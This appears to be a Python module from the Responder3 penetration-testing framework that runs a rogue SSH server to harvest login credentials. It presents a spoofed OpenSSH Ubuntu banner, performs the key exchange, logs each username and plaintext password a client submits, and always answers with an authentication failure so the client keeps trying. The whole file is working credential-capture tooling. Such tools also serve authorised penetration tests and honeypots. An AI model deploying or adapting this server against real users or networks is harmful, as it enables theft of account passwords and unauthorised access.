#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#
# Module to grab SSH credentials

import logging
import asyncio


from responder3.core.logging.logger import *
from responder3.core.asyncio_helpers import R3ConnectionClosed
from responder3.core.commons import *
from responder3.protocols.SSH import *
from responder3.core.servertemplate import ResponderServer, ResponderServerSession

#

class SSHSession(ResponderServerSession):
	def __init__(self, connection, log_queue):
		ResponderServerSession.__init__(self, connection, log_queue, self.__class__.__name__)
		self.cipher = None
		self.state = 'BANNER'
		self.client_banner = None
		self.server_banner = 'SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2'
		self.client_kxinit = None
		self.server_kxinit = None
		self.parser = SSHParser
		self.sequence_number = 0

	def increase_seq_no(self):
		self.sequence_number += 1
		self.sequence_number = self.sequence_number % 2**32

	def get_seq_no(self):
		return self.sequence_number.to_bytes(4, byteorder = 'big', signed = False)

	def __repr__(self):
		t  = '== SSHSession ==\r\n'
		return t


class SSH(ResponderServer):
	def init(self):
		self.parse_settings()
		
	def parse_settings(self):
		pass

	@r3trafficlogexception
	async def send_enc_packet(self, payload):
		packet = SSHPacket()
		packet.payload = payload

		data = packet.to_bytes(cipher = self.session.cipher)
		data_enc = self.session.cipher.server_cipher.encrypt(data)
		mac_obj = self.session.cipher.get_server_hmac()
		mac_obj.update(self.session.get_seq_no())
		mac_obj.update(data)
		mac = mac_obj.digest()

		self.cwriter.write(data_enc + mac)
		await self.cwriter.drain()
		self.session.increase_seq_no()

	@r3trafficlogexception
	async def send_packet(self, payload):
		packet = SSHPacket()
		packet.payload = payload
		self.cwriter.write(packet.to_bytes())
		await self.cwriter.drain()

		self.session.increase_seq_no()


	async def banner_exchange(self, timeout=1):
		try:
			#read client banner
			client_banner = await readline_or_exc(self.creader, timeout=timeout)
			self.session.client_banner = client_banner.decode().strip()
			print(self.session.client_banner)
			
			#send server banner
			self.cwriter.write(self.session.server_banner.encode()+b'\r\n')
			await self.cwriter.drain()
			
			return 'OK'
			
		except Exception as e:
			print(e)
			return 'NO'
		
	@r3trafficlogexception	
	async def key_exchange(self, msg, timeout = 1):
			cipher = SSHCipher()
			self.session.client_kxinit = msg.payload.raw

			##############################################
			packet = SSHPacket()
			packet.payload = cipher.generate_server_key_rply()
			packet_data = packet.to_bytes()
			self.session.server_kxinit = packet.payload.to_bytes()
			############################################

			await self.send_packet(packet.payload)
			
			msg = await asyncio.wait_for(self.session.parser.from_streamreader(self.creader), timeout = 20)
			print(str(msg))
			
			payload = cipher.calculate_kex(self.session.client_banner.encode(), self.session.server_banner.encode(), self.session.client_kxinit, self.session.server_kxinit, msg.payload)
			
			await self.send_packet(payload)
			await self.send_packet(SSH_MSG_NEWKEYS())
			
			return cipher
		
	@r3trafficlogexception
	async def run(self):
		while not self.shutdown_evt.is_set():
			if self.session.state == 'BANNER':
				status = await self.banner_exchange()
				print(status)
				if status == 'OK':
					self.session.state = 'KEX'
					continue
				raise Exception('Banner exchange failed!')

			try:
				result = await asyncio.gather(*[asyncio.wait_for(self.session.parser.from_streamreader(self.creader, cipher = self.session.cipher, sequence_number = self.session.get_seq_no()), timeout=None)], return_exceptions=True)
			except asyncio.CancelledError as e:
				raise e
			if isinstance(result[0], R3ConnectionClosed):
				return
			elif isinstance(result[0], Exception):
				raise result[0]
			else:
				msg = result[0]
					
			print(str(msg))
			
					
			if self.session.state == 'KEX':
				print('KEX')
				cipher = await self.key_exchange(msg)
				self.session.state = 'EXPECT_NEWKEYS'
				continue

			elif self.session.state == 'EXPECT_NEWKEYS':
				if not isinstance(msg.payload, SSH_MSG_NEWKEYS):
					raise Exception('Expected NEWKEYS, got %s' % type(msg.payload))

				self.session.cipher = cipher
				self.session.state = 'AUTHENTICATION'
				continue

			elif self.session.state == 'AUTHENTICATION':
				#here should be the atuhentication part
				print('AUTHENTICATION')
				if isinstance(msg.payload, SSH_MSG_USERAUTH_REQUEST):
					print('SSH_MSG_USERAUTH_REQUEST')
					print(msg.payload)

					if msg.payload.method_name.lower() == 'password':
						cred = Credential(
									credtype = 'PLAIN',
									username = msg.payload.user_name, 
									password = msg.payload.method.password,
									fullhash='%s:%s' % (msg.payload.user_name, msg.payload.method.password)		
								)
						await self.logger.credential(cred)
						payload = SSH_MSG_USERAUTH_FAILURE()
						payload.authentications = ['password']
						payload.partial_success = False
						await self.send_enc_packet(payload)
						continue

					if msg.payload.method_name.lower() == 'none':
						payload = SSH_MSG_USERAUTH_FAILURE()
						payload.authentications = ['password']
						payload.partial_success = False
						await self.send_enc_packet(payload)
						continue

					else:
						payload = SSH_MSG_USERAUTH_FAILURE()
						payload.authentications = ['password']
						payload.partial_success = False
						await self.send_enc_packet(payload)
						continue
				else:
					if msg.payload.service_name == 'ssh-userauth':
						p = SSH_MSG_SERVICE_ACCEPT()
						p.service_name = msg.payload.service_name
						await self.send_enc_packet(p)
						
						continue
					else:
						raise Exception('Not supported service! %s' % msg.payload.service_name)
						break
					